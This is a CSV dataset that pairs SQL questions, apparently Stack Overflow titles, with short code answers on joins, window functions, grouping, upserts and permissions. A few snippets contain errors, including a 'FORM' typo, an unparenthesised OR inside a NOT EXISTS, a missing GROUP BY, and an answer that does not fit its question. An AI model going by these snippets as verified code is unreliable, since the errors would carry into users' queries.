,Unnamed: 0,NL,Code
6171,48051,"How to insert if not exists, or increase if exists in SQLite?","INSERT OR REPLACE INTO Test (Id,Val) 
  VALUES (  1,          
            COALESCE((SELECT Val + 1 FROM Test WHERE id = 1), 1)
          );
INSERT OR REPLACE INTO Test (Id,Val) 
  VALUES (  2,          
            COALESCE((SELECT Val + 1 FROM Test WHERE id = 2), 1)
          );
"
25565,45918,Efficient query for finding duplicate records,"SELECT
    *
FROM
    Transactions t1
        inner join
    Transactions t2
        on
            t1.Terminal = t2.Terminal and
            t1.Amount = t2.Amount and
            DATEDIFF(minute,t2.TransactionDate,t1.TransactionDate) between 0 and 10 and
            t1.TransactionID > t2.TransactionID /* prevent matching the same row */
"
38114,71424,Microsoft Access Query Top 50% and Last 50% Values,"select * 
from TABLE
where TABLEID not in (
    select top (
        (select count(*) from TABLE) - 700000
    ) TABLEID
    from TABLE
)
"
945,66547,mysql query to update all values +1 where value is less than 100,"update test set value=value+1 where value < 100
"
17764,67841,How to GROUP BY in groups of N rows?,"select avg(age)
from (select t.*, (@rn := @rn + 1) as seqnum
      from table t cross join
           (select @rn := 0) vars
      order by mydate desc
     ) t
group by floor((seqnum - 1) / 3);
"
16197,38705,Oracle SQL - Update procedure only non null values,"UPDATE CUSTOMER_INFO
   SET CUSTOMER_TYPE     = NVL(CustomerType, CUSTOMER_TYPE),
       CUSTOMER_NAME     = NVL(CustomerName, CUSTOMER_NAME),
       CUSTOMER_GENDER   = NVL(CustomerGender, CUSTOMER_GENDER),
       CUSTOMER_BIRTHDAY = NVL(CustomerBirthday, CUSTOMER_BIRTHDAY)
 WHERE CUSTOMER_ID = CustomerID;
"
4315,20188,The server principal Xuser is not able to access the database Ydb under the current security context. sql server 2008,"USE [Kdb];
GO
GRANT CONNECT TO guest;
"
14976,49421,Trying to join 2 tables with same column names,"SELECT email, password FROM companies_tbl
UNION ALL SELECT email, password FROM korisnici_tbl
"
16090,61768,"Combine: updating Values Code (with Case statement, Inner Join)","update New_Clients_Report set
YTD_Jan13 = (case   when StatementID>=NewClientDate then 'New from ' 
             + REPLACE(RIGHT(CONVERT(VARCHAR(9), NewClientDate, 6), 6), ' ', '-')
             else 'Repead' end)
from New_Clients_Report so inner join MonthSales_NC nc
on so.ClientID=nc.NewClientID 
--and nc.NewClientDate='01.01.2013'
"
658,71612,how to check if there exists 2nd highest score in SQL?,"SELECT MAX(score)
FROM table_name
WHERE score<>(
SELECT MAX(score)
FROM table_name);
"
35416,56134,Select Records Only Having Records within Supplied Date Range,"SELECT * 
FROM Cart AS c
INNER JOIN CartDetail AS cd ON cd.CartId = c.Id
WHERE cd.DateAdded BETWEEN @start_date AND @end_date
      AND 
      NOT EXISTS (SELECT 1
                  FROM CartDetail AS cd2
                  WHERE cd2.CartId = c.Id AND
                        cd2.DateAdded < @start_date OR cd2.DateAdded > @end_date)
"
34031,75446,MySql SELECT COUNT ... NOT LIKE,"SELECT 
    COUNT(
            CASE 
                WHEN restricted NOT LIKE '%us%' THEN 2 
                ELSE 1 
            END
    ) AS totalcount 
FROM 
    reviews 
WHERE 
    restricted NOT LIKE '%us%' 
    AND restricted != '' 
    AND restricted IS NOT NULL
"
21733,65485,"sql query help, syntax help to select records not selected by inner select statement","select pid from table where pid not in (select top 10 pid from table1)
"
12126,39716,SQL import/export,"SELECT'INSERT INTO Table1(Col1,Col2) VALUES('+CAST(Col1 AS VARCHAR(500))+',' +CAST(Col2 AS VARCHAR(500))+')' FROM Table1  
"
31174,70512,Receive product groups and products with one query,"hashmap results, parent, nodes, nodes_new; # variables


foreach  (res in sql_execute(""SELECT id, parent_id FROM product_group;"") ) {
    parent[res.id] = res.parent_id;
}

# get groups with products
foreach  (res in sql_execute(""SELECT pg.id FROM product_group AS pg INNER JOIN 
        product AS p ON pg.id = p.group_id 
        WHERE p.quick_select = 1 GROUP BY pg.id "") ) {
    nodes[res.id] = res.id;
}

while (length(nodes) > 0) {
    foreach (i in nodes) {
        if (i = 0) { results[i] = i; } # if its a root node, add to results
        else { nodes_new[parent[i]] = parent[i]; } # otherwise, add parent to the next round
    }
    nodes = nodes_new; # prepare for next round
}

print results;
"
23005,30021,SQL select one row for every n minutes,"Declare @NumberPerHour Int = 20

;With Cte As
(
    Select  DateTime, Row_Number() Over (Partition By DateDiff(Hour, 0, DateTime) Order By NewId()) RN
    From    Master
)
Select  DateTime
From    Cte
Where   RN <= @NumberPerHour
Order By DateTime Asc
"
27565,59310,Declare a variable in Oracle SQL to use in a query,"variable var DATE
exec :var := '15-OCT-13'
"
1248,53236,Add AS-Expression to selected columns in getCollection(),"$_products->getSelect()
    ->columns(
         array(
             'category_name' => new Zend_Db_Expr('some string')
         )
    );
"
15789,13419,drop all tables from sql ce database,"select 'drop table ' || table_name || ';'
  from information_schema.tables;
"
35235,37754,intervals with equal density sql,"SELECT  MIN(number_of_trades)::text || '-' || MAX(number_of_trades)::text AS ""number of trades"" 
, COUNT(number_of_trades) AS ""number of traders""
, AVG(number_of_trades*profit) AS AvgProfit 
FROM 
(
   SELECT ROW_NUMBER() OVER(ORDER BY number_of_trades) AS rn
     , number_of_trades
     , profit 
     , (COUNT(*) OVER(PARTITION BY NULL) / 100) AS Grp
   FROM TradersStat
  ) tab
GROUP BY (rn - 1) / Grp
"
23686,48367,How to remove some value from SQL Table by query,"BEGIN TRAN
UPDATE CustomerImage SET Link = REPLACE(Link, 'pages/small/', '')
SELECT * FROM CustomerImage
ROLLBACK  --change this to a commit after you're sure it's working the way you want
"
14180,72979,MySQL for grouping with one column and getting a subgroup from another column,"SELECT COUNT(*) AS ""times"", username, date
FROM mytable 
GROUP BY date, username ORDER BY date DESC
"
9237,16986,How do I tell if data formatting inconsistencies are themselves consistent?,"select t1.*
from t1
where not exists (select 1
                  from t2
                  where t2.name = substring(t1.columnB, 6)
                 );
"
32055,36646,SQL View select data from two fields and combine into one,"CASE WHEN ID1 = 'blank' THEN ID2 ELSE ID1 END
"
39769,45788,On a single column : Algebraic operation on Aggregate functions,"select sum(case when mod(id,2)=0 then A else 0 end) -
       sum(case when mod(id,2)=0 then 0 else a end)
  from test
 where yourCondition
"
11379,12575,Avoid unique conflicts on insert SQL SERVER,"CREATE TABLE products (
    ProductId INT IDENTITY(1, 1), 
    ProductType int, ProductOwnerId INT, 

    CONSTRAINT [unq_type_owner] UNIQUE (ProductType, ProductOwnerId)
);

MERGE INTO dbo.products p
USING (VALUES (22, 44))  AS source(ProductType, ProductOwnerId)
ON p.ProductType = source.ProductType AND p.ProductOwnerId = source.ProductOwnerId

WHEN NOT MATCHED THEN
    INSERT (ProductType, ProductOwnerId)
    VALUES (source.ProductType, source.ProductOwnerId)

-- OPTIONAL OUTPUT
OUTPUT $action, Inserted.* ;
"
25353,16407,Get last record for each date from a table,"WITH MyCte AS (SELECT  *,
                       RowNum = ROW_NUMBER() OVER (PARTITION BY CONVERT(CHAR(8), UpdateDateTime, 112) ORDER BY UpdateDateTime DESC ) 
               FROM    InventoryHistory
               WHERE   UpdateDateTime >= convert(char(8), dateadd(yy, -30, getdate()), 112)
                       AND DATEPART(hh, UpdateDateTime) < 17)
SELECT   UpdateID, 
         ProductID, 
         UpdateDateTime, 
         QuantityOnHand 
FROM     MyCte
WHERE    RowNum = 1


/* Results 
UpdateID    ProductID   UpdateDateTime          QuantityOnHand
----------- ----------- ----------------------- --------------
2           1           2009-07-29 14:00:00.000 99
4           1           2009-07-30 09:00:00.000 97

(2 row(s) affected)
*/
"
10047,60035,"In SQL how can I have two fields that can't both be identical, only one is a primary key","create table ProductTasks
 ( ProductID ...
 , TaskId ...
 , TaskOrder ...
 , primary key (ProductId, TaskId)
 , unique (ProductId, TaskOrder)
 );
"
34462,19442,SQL select distinct rows,"SELECT col1, MAX(col2) FROM some_table GROUP BY col1;
"
20091,53773,Select with priority order,"with car as (select 1 id, 'bmw' model, 'blue' colour from dual union all
             select 2 id, 'bmw' model, 'red' colour from dual union all
             select 3 id, 'bmw' model, null colour from dual union all
             select 4 id, 'porsche' model, null colour from dual union all
             select 5 id, 'porsche' model, 'red' colour from dual union all
             select 6 id, 'vw' model, 'orange' colour from dual union all
             select 7 id, 'car' model, null colour from dual union all
             select 8 id, 'vw' model, 'purple' colour from dual)
select id,
       model
from   (select id,
               model,
               colour,
               row_number() over (partition by model 
                                  order by decode(colour, 'blue', 1, 'red', 2, 3), colour) rn
        from   car)
where  rn = 1
order by id;

    ID MODEL  
---------- -------
         1 bmw    
         5 porsche
         6 vw     
         7 car 
"
20502,14560,Mysql Database Layout,"table store will contains your 2000s stores
    id
    name

table code will contains your 50 codes
    id
    name

table code_store will contains only the valid codes ID, and related store_id(no need to save invalid ones I guess)
    code_id
    store_id
"
12899,40281,Change sql parameter based on a public variable from an if statement,"Dim MachineEnd As String
    'declare machine end string
If Combobox.SelectedValue = 5 Then
    MachineEnd = ""StringA""
ElseIf Combobox.SelectedValue = 6 Then
    MachineEnd = ""StringB""
ElseIf Combobox.SelectedValue = 7 Then
    MachineEnd = ""StringC""
...
    End if
...
"
12737,42417,SQL - Selecting unique values from one column then filtering based on another,"select * from T where Product_type = 'B' and id in (
select id from T
    group by id
    having count(id) = 1)
"
8440,66465,Can I set VARCHAR size larger than 8k but less than MAX?,"CHECK (DATALENGTH([VarChar10000]) <= 10000)
"
34774,30279,Cannot get anything to return via SQL Query,"SELECT job_name, job_start_time, job_end_time 
FROM job
WHERE (date(job_start_time) = date('2014-02-10') AND job_name = 'start') or
      (date(job_end_time) = date('2014-02-11') AND job_name = 'end')
ORDER BY job_end_time ASC;
"
32858,70087,SQL select statement with column being null sometimes,"  with w_data as ( 
           select 33 volume, 1234 ticket, 10.5 hours, 190 rate, 1995 amount from dual union all
           select 90 volume, 1234 ticket, 90   hours, 100 rate, 9000 amount from dual union all
           select 33 volume, 1235 ticket, 11   hours, 190 rate, 2090 amount from dual union all
           select 90 volume, 1235 ticket, 90   hours, 110 rate, 9900 amount from dual 
        )
  Select case when ticket = lag(ticket) over (partition by ticket order by ticket, volume) then volume else null end new_volume, 
        case when ticket = lag(ticket) over (partition by ticket order by ticket, volume) then null else ticket end new_ticket, 
           hours, rate, amount
    from w_data
  order by ticket, volume
  /

  NEW_VOLUME NEW_TICKET      HOURS       RATE     AMOUNT
  ---------- ---------- ---------- ---------- ----------
                   1234       10.5        190       1995
          90                    90        100       9000
                   1235         11        190       2090
          90                    90        110       9900

  4 rows selected.
"
21770,43893,"Convert SQL to Linq - Where, Groupby and Having","var result = context.dailypos
    .GroupBy(x => x.posdate)
    .Where(g => g.Select(x => x.customernumber).Distinct().Count() == 3)
    .Select(g => g.Key)
    .OrderByDescending(x => x)
    .Take(1);
"
30146,64099,SQLite - How to get query's result depending linked tables?," SELECT * FROM place_table WHERE id IN (SELECT place_id FROM spot_table)
"
19427,25431,MySQL - Grouping and counting,"select a.placement_id, p.name as placement_name, count(l.status)
from actions a
inner join placements p on p.id = a.placement_id 
inner join leads l on l.id = a.lead_id 
group by a.placement_id, p.name
"
4653,4476,Minimum GRANTs needed by mysqldump for dumping a full schema? (TRIGGERs are missing!!),"GRANT USAGE ON *.* TO 'dump'@'%' IDENTIFIED BY ...;
GRANT SELECT, LOCK TABLES ON `mysql`.* TO 'dump'@'%';
GRANT SELECT, LOCK TABLES, SHOW VIEW, EVENT, TRIGGER ON `myschema`.* TO 'dump'@'%';
"
11123,34083,SQL table references,"code example
SELECT * FROM Person
JOIN Account ON (Person.ID = Account.owner)
WHERE Person.ID = XY;
"
16608,48103,Select badges from table only if all requirements rows exist,"SELECT badge_id
FROM  (  -- count missions per badge for the given user
   SELECT br.badge_id, count(*) AS ct
   FROM   finished_missions fm
   JOIN   badge_requirements br USING (mission_id)
   WHERE  fm.user_id = 221
   GROUP  BY  1
   ) u  -- count missions per badge total
JOIN (
   SELECT br.badge_id, count(*) AS ct
   FROM   badge_requirements
   ) b USING (badge_id, ct)  -- only badges with the full count of missions
"
30357,62457,SUM() all rows after current row,"select level, count, sum(count) over (order by level desc) as cumecount
from t;
"
27637,16255,Oracle : how to find occurrence of specified value in particular column of a table in oracle,"Select nvl(MAX(col),'NA')
from (select id, col from table
      where id = 1 
      union all 
      select 1 id, null from dual)
group by id
"
555,69505,Create a DATABASE using as a Name from a Variable,"-- Set Data Base name
DECLARE @DataBaseName sysname;
SET @DataBaseName = 'DbCmsWebsiteTest';

IF (@DataBaseName  LIKE '%[^0-9A-Z]%')
    RAISERROR('Invalid Characters in Name, %s',16,1,@DataBaseName)
ELSE
    BEGIN
    SET @DataBaseName = QUOTENAME(@DataBaseName)
    EXEC('CREATE DATABASE '+ @DataBaseName)
    END
"
31117,29710,"Doing an ""if"" type statement in a sql where clause","Select a.ItemID, b.ConversionFactor VCaseAmt, sum(c.ConversionFactor + 1) SCaseAmt, a.status, a.UserFld2

From timItem a inner join
    timItemUnitOfMeas b on a.ItemKey = b.ItemKey and b.TargetUnitMeasKey = 115 left join
    timItemUnitOfMeas c on a.ItemKey = c.ItemKey and c.TargetUnitMeasKey = 116 left join
    timItemUnitOfMeas d on a.ItemKey = d.ItemKey and d.TargetUnitMeasKey = 126

Where d.TargetUnitMeasKey is null and b.ConversionFactor != c.ConversionFactor + 1 and a.Status = 1 and 
not (a.itemid like 'd%' AND a.userfld2 = 'Container') 

Group by a.ItemID, b.TargetUnitMeasKey, b.ConversionFactor, C.TargetUnitMeasKey, c.ConversionFactor, a.status, a.UserFld2

Order by a.ItemID
"
9723,7223,SELECT MAX field value OR zero value,"SELECT case when min(abs(time)) = 0 then 0 else max(time) end FROM user_groups;
"
29833,46956,Permanently Set Postgresql Schema Path,"ALTER ROLE <your_login_role> SET search_path TO a,b,c;
"
7637,11142,Copy rows between databases in SQL server,"INSERT INTO target(field1, field2, field3)
SELECT field1, field2, field3 FROM source;
"
11321,3301,"IF, EXISTS and SELECT in one SQL query","    DECLARE var0 INT;

    SELECT COUNT(*) INTO var0 FROM table 
    WHERE WOLOLO IS NOT NULL and RED = '10'; 


    IF var0>0 THEN
     SELECT BLUE FROM table 
    END IF;

    IF var0=0 THEN
     INSERT INTO table ....
    END IF;    
"
37183,13062,Archiving large amounts of old data in SQL Server,"SELECT * INTO ANewArchiveTable
FROM CurrentTable
WHERE SomeDateColumn <= DATEADD(year, -2, GETDATE())
"
5554,47526,"SQL select rows based on newest date, with sum of older included?",";WITH x AS 
(
  SELECT CustNum, CustName, SalesMan, Address, 
    s = SUM(SoldTotal) OVER (PARTITION BY CustNum),
    r = ROW_NUMBER() OVER (PARTITION BY CustNum ORDER BY SaleDate DESC)
  FROM dbo.YourTable
)
SELECT CustNum, CustName, SalesMan, Address, SoldTotal = s
  FROM x
  WHERE r = 1;
"
27036,5479,MySQL show ranks of multiple columns,"SELECT Name,Height,Weight,FIND_IN_SET( Height,( SELECT GROUP_CONCAT( Height ORDER BY Height DESC ) FROM scores )) AS Height_Rank,FIND_IN_SET( Weight,( SELECT GROUP_CONCAT( Weight ORDER BY Weight DESC ) FROM scores ) ) AS Weight_Rank FROM scores
"
6174,2917,MySQL - combining multiple queries,"SELECT  a.id AS steam, 
        a.skills AS level,
        b.name
FROM    wcgousers a
        INNER JOIN warn_oldnames b
            ON a.ID = b.ID
        INNER JOIN
        (
            SELECT  ID, MAX(lasttime) max_date
            FROM    warn_oldnames
            GROUP   BY ID
        ) c ON  b.ID = c.ID AND
                b.lastTime = c.max_date
WHERE   a.race = '_wcs_'
-- ORDER  BY ABS(a.skills) DESC 
-- LIMIT  10
"
28640,51814,"How to show x,y,count(*) in 2-D by one SQL?","SELECT row,
SUM(CASE WHEN col= 'x1' THEN 1 else 0 END) AS x1,
SUM(CASE WHEN col= 'x2' THEN 1 else 0 END) AS x2,
SUM(CASE WHEN col= 'x3' THEN 1 else 0 END) AS x3
FROM data 
GROUP BY row;
"
12495,47188,How to select elements from a table referenced by another table?,"select * 
from resultsTable r
join parameterTable p on r.parameterKey = p.id
join fileTable f on r.fileKey = f.id
join fileType ft on ft.id = f.fileType
where ft.type = 'fileTypeA'
"
36014,50577,Laravel 4.2 open a second database connection to the main database,"$pdo = DB::connection('connection 2 name here')->getPdo();
"
26063,39879,Get max number from table add one and check with specific convention,"SELECT CASE WHEN r.number IS NULL THEN 1001
            WHEN r.number = 9999 THEN 10001
            ELSE r.number + 1 END number
FROM ( VALUES(12) ) AS a(category)
LEFT JOIN (
  SELECT PARSENAME(prodno, 3) category,
         MAX(CAST(PARSENAME(prodno, 2) AS INT)) number
  FROM products
  GROUP BY PARSENAME(prodno, 3)
) r
ON r.category = a.category;
"
5327,41056,How to combine resulting rows into a single row seperated by commas,"CREATE TABLE ConvertRowsToSingleCell
(
    sequence int
    ,tag varchar(max)
    ,associatedId varchar(max)
)

INSERT INTO ConvertRowsToSingleCell
VALUES 
    (1,'MA2D8111AM', 'MA2D811S')
    ,(2, 'MA2D8112AM', 'MA2D811S')
    ,(3, 'MA2D8113AM', 'MA2D811S')
    ,(4, 'MA2D8114AM', 'MA2D811S')

DECLARE @Length int = (Select COUNT(*) FROM ConvertRowsToSingleCell)
        ,@Increment int = 1
        ,@Item varchar(max)
        ,@ConcatenatedString varchar(max);

WHILE @Increment <= @Length
BEGIN

    IF (@Increment = @Length) --Remove comma at end
        BEGIN
            Select @Item = tag + ':' + associatedId from ConvertRowsToSingleCell
            where @Increment = sequence
        END
    ELSE
        BEGIN
            Select @Item = tag + ':' + associatedId + ', ' from ConvertRowsToSingleCell
            where @Increment = sequence
        END
    Set @ConcatenatedString = ISNULL(@ConcatenatedString,'') + @Item
    SET @Increment = @Increment + 1 
END

Select @ConcatenatedString
"
38473,62108,take top 3 count from two table SQLSERVER 2008,"SELECT TOP 3 dbo.Family.F_id
FROM dbo.Family 
INNER JOIN dbo.Family_member
ON dbo.Family.F_id = dbo.Family_member.FM_f_id
GROUP BY dbo.Family.F_id
ORDER BY count(*) DESC 
"
7715,40084,SQL multiple rows as columns with out using PL/SQL,"SELECT q_id, 
       q_text,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 0) as option1,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 1) as option2,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 2) as option3,
       (SELECT a_text 
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 3) as option4,
       (SELECT a_text
          FROM answers a1
         WHERE a1.a_id = (select a_id from correct_answers c1 where c1.q_id = q1.q_id)) as correct
  FROM questions q1;
"
11083,41388,Get specific part of dynamic string in TSQL,"declare @src nvarchar(max), @Start_Position int, @End_Position int
select @src = 'AA=Item0,ZZ=Item1,ZZ=Item2,ZZ=Item3,ZZ=Item4,ZZ=Item5'

select @Start_Position = charindex('ZZ', @src, charindex('ZZ', @src) + 1) + 3
select @End_Position = charindex(',ZZ', @src, @Start_Position)

select substring(@src, @Start_Position, @End_Position - @Start_Position)
"
13989,24926,Query to ORDER BY the number of rows returned from another SELECT,"SELECT *
FORM   users u
LEFT   JOIN (
   SELECT user_id, count(*) AS friends
   FROM   friends
   ) f USING (user_id)
ORDER  BY f.friends DESC NULLS LAST, user_id -- as tiebreaker
"
33142,18437,"use of case when else in sql , not getting intended result","select ROW_NUMBER() OVER (ORDER BY QMID) AS SrNo,
       max(CASE Language WHEN 1 THEN Question end) as English,
       max(CASE Language WHEN 2 THEN Question end) as Spanish
from QuestionMaster
group by QMID
"
15081,18556,In MySQL How do I specify Collation for WHERE-IN clause?,"WHERE email_address IN ('foo@bar.com' COLLATE utf8_general_ci, 'test@test.com' COLLATE utf8_general_ci)
"
38025,42563,show balance stock,"declare @tb table (itemCode varchar(10),DateofReceipt date,invno varchar(10), inqty int)
    insert into @tb (itemcode,dateofReceipt,invno,inqty) values
    ('A00001','20150401','Inv01',100),
    ('A00001','20150410','Inv03',50),
    ('A00002','20150405','Inv02',100),
    ('A00002','20150415','Inv04',50)

    declare @stock table(item varchar(10),qty int)
    insert into @stock (item,qty) values
    ('A00001',50),('A00002',120)

    ;with cte as (select *,case when row_number() over(partition by itemCode order by DateofReceipt desc )=1 then qty else 0 end as stk,
    row_number() over(order by itemcode, DateofReceipt desc) as rno
    from @tb t inner join @stock s on t.itemCode=s.item),
    ct1 (stock,bls,rno) as (select case when stk<=inqty then stk else inqty end as stock,case when stk<=inqty then 0 else stk-inqty end as bls,rno from cte where rno=1
    union all select case when stk+bls<=inqty then stk+bls else inqty end as stock,case when stk+bls<=inqty then 0 else stk+bls-inqty end as bls,cte.rno from ct1 inner join cte on ct1.rno+1=cte.rno)

    select itemcode,dateofReceipt,invno,inqty,stock from ct1 inner join cte on ct1.rno =cte.rno
"
32102,63956,NOT IN clause and NULL value,"WHERE NAME NOT IN ('C') OR NAME IS NULL
"
38831,9849,Select numbers not present in multiple number series in Oracle,"select sequence_number from myvalues m
where not exists
 ( select 1 from myseries s where m.sequence_number between s.start_sequence
   and s.end_sequence )
"
38789,65209,Android: Fetching values from arraylist of map," String[] stockArr = new String[map_all_info_photoarraylist.size()];
          for(int i =0; i<map_all_info_photoarraylist.size(); i++){
              stockArr[i] = map_all_info_photoarraylist.get(i).get_photo_ref();
           }
"
17192,7379,SQL subqueries coding style,"select t4.foo
from table2 t1
join table2 t2 on t2.idparent = t1.idchild
join table2 t3 on t3.idparent = t2.idchild
join table t4 on t4.foo_id = t3.idchild and t4.txt_type ='some_cat'
where t1.idparent = @id
"
34955,4416,Surround Variable with Single Quotes when Passing SQL Smalldatetime,"DECLARE @return_value int
    ,@TaskID int
    ,@CompletedDate smalldatetime
SET @TaskID = 90
SET @CompletedDate = '2010-01-20 15:28:00'

EXEC    @return_value = [dbo].[usp_Task_Completion]
        @TaskID = @TaskID,
        @CompletedDate = @CompletedDate
"
20210,68048,filling one table column with if else statement in SQL,"SELECT p.Name,
    CASE WHEN X.ProductID IS NULL THEN 'NO' ELSE 'YES' END AS InTopTen
FROM Production.Product p
LEFT JOIN
(
     SELECT TOP 10 ProductID FROM Sales.SalesOrderDetail
     GROUP BY ProductID 
     ORDER BY COUNT(*) DESC
) X
ON X.ProductID = p.ProductID
"
31877,61869,sql - How to select so that the row can be column?,"select * 
from YourTable src
pivot (max(name) for name_location in ([london], [beijing]) ) p
"
7694,7645,SQL left Join with no matches in where,"SELECT ITEM.ID, DAT1.DATE, DAT2.DATE, DAT3.DATE
FROM ITEM 
LEFT JOIN DATES AS DAT1 ON DAT1.ITEM_ID = ITEM.ID AND DAT1.FUNCTCODE ='START'
LEFT JOIN DATES AS DAT2 ON DAT2.ITEM_ID = ITEM.ID AND DAT2.FUNCTCODE ='END'
LEFT JOIN DATES AS DAT3 ON DAT3.ITEM_ID = ITEM.ID AND  DAT3.FUNCTCODE ='REFURBISHED'
WHERE ITEM.ID > 2000;
"
29865,14398,Oracle Text Search on certain columns,"CONTAINS(indexme,'jack INPATH(/HELPER/EMP_NAME) and jill INPATH(/HELPER/SUPERVISOR)') > 0;
"
32559,62860,How to understand what I need to do in a query,"SELECT name,continent,population FROM world x
  WHERE 25000000 >= ALL (
    SELECT population FROM world y
     WHERE x.continent=y.continent
       AND y.population>0)
"
26621,23141,SQL Server equivalent of PostgreSQL distinct on (),";WITH CTE AS
(
    SELECT *, ROW_NUMBER() OVER(PARTITION BY a ORDER BY b) Corr
    FROM my_table
)
SELECT *
FROM CTE
WHERE Corr = 1
"
14991,26419,Paradox DB SQL Multiple JOINS,"FROM 
    (
        ""CHECK"" C
        INNER JOIN 
        ""RCHECK"" R
            ON C.Cnum = R.Cnum 
    )
    INNER JOIN 
    ""PCHECK"" P
        ON P.Cnum = C.Cnum 
"
9862,58858,Compare Oracle table columns in SQL,"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='A' AND OWNER='YourSchema'
minus
SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='B' AND OWNER='YourSchema'
"
1579,44749,Mongodb - Database hits,"db.pages.update({page: ""index""}, {$inc: {hits: 1}})
"
3132,12411,SQL get latest record for each ID,"select u.id, u.name, s.saldo, p.last_paid_date, p2.amount
  from users u
  join saldo s
    on u.id = s.user_id
  join (select user_id, max(paid_date) as last_paid_date
          from payments
         group by user_id) p
    on u.id = p.user_id
  join payments p2
    on p.last_paid_date = p2.paid_date
   and p.user_id = p2.user_id
"
33089,38582,how to create triggers in sqlite3?,"CREATE TABLE child(
  id         INTEGER,
  some_info  TEXT, 
  master_id  INTEGER,
  FOREIGN KEY(master_id) REFERENCES master(id) ON DELETE CASCADE
);
"
18694,29680,SQL query to retrieve SUM in various DATE ranges,"SELECT SUM(totalprice), year(date), month(date) from sales
group by year(date), month(date)
"
7111,74017,Select using LEFT OUTER JOIN with condition,"SELECT A.id,
       A.name,
       B.[datetime]
FROM   tableA A
       LEFT OUTER JOIN tableB B
                    ON A.Id = B.id
                       AND B.[datetime] < @date 
"
3165,13337,Update using GROUP by,"update 
SalesQuotesTest.dbo.Quote 
set CurrentQuote = 1
where OriginalQuoteID in ( select OriginalQuoteID 
                           from SalesQuotesTest.dbo.Quote 
                           group by OriginalQuoteID
                           having COUNT(*) < 2
                          )
"
